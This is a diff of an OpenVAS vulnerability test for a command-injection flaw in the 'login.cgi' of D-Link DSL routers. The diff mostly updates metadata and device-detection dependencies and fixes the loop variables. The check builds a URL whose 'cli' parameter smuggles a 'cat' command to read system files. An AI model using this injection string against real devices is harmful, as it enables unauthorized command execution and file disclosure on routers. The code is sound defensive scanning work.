@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dlink_dsl_login_rce_vuln.nasl 12045 2018-10-24 06:51:17Z mmartin $
+# $Id: gb_dlink_dsl_login_rce_vuln.nasl 12248 2018-11-07 15:25:41Z cfischer $
 #
 # D-Link DSL Devices 'login.cgi' Remote Command Execution Vulnerability
 #
@@ -24,22 +24,22 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = "cpe:/h:dlink";
+CPE = "cpe:/o:dlink";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108458");
-  script_version("$Revision: 12045 $");
+  script_version("$Revision: 12248 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-24 08:51:17 +0200 (Wed, 24 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-07 16:25:41 +0100 (Wed, 07 Nov 2018) $");
   script_tag(name:"creation_date", value:"2018-09-04 09:45:51 +0200 (Tue, 04 Sep 2018)");
   script_name("D-Link DSL Devices 'login.cgi' Remote Command Execution Vulnerability");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_dlink_dsl_detect.nasl");
-  script_mandatory_keys("host_is_dlink_dsl");
+  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl");
+  script_mandatory_keys("Host/is_dlink_device"); # nb: Experiences in the past have shown that various different devices are affected
   script_require_ports("Services/www", 80);
 
   script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/53");
@@ -51,17 +51,17 @@ if(description)
 
   This vulnerability was known to be used by an unknown Botnet in 2018.");
 
-  script_tag(name:"vuldetect", value:"Send the crafted HTTP POST request
+  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request
   and check whether it is possible to read a file on the filesystem or not.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow a remote
   attacker to read arbitrary files on the target system.");
 
   script_tag(name:"affected", value:"D-Link DSL-2750B with Firmware Version
-  1.0.1 to 1.0.3. Other models or versions might be also affected.");
+  1.0.1 to 1.0.3. Other devices, models or versions might be also affected.");
 
   script_tag(name:"solution", value:"No known solution is available as of
-  04th September, 2018. Information regarding this issue will be updated once
+  07th November, 2018. Information regarding this issue will be updated once
   solution details are available.");
 
   script_tag(name:"qod_type", value:"remote_vul");
@@ -79,11 +79,12 @@ if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );
 
 files = traversal_files( "linux" );
 
-foreach file( keys( files ) ) {
+foreach pattern( keys( files ) ) {
 
-  url = "/login.cgi?cli=multilingual%20show%27;cat%20/" + files[file] + "%27$";
+  file = files[pattern];
+  url = "/login.cgi?cli=multilingual%20show%27;cat%20/" + file + "%27$";
 
-  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
     report = report_vuln_url( port:port, url:url );
     security_message( port:port, data:report );
     exit( 0 );
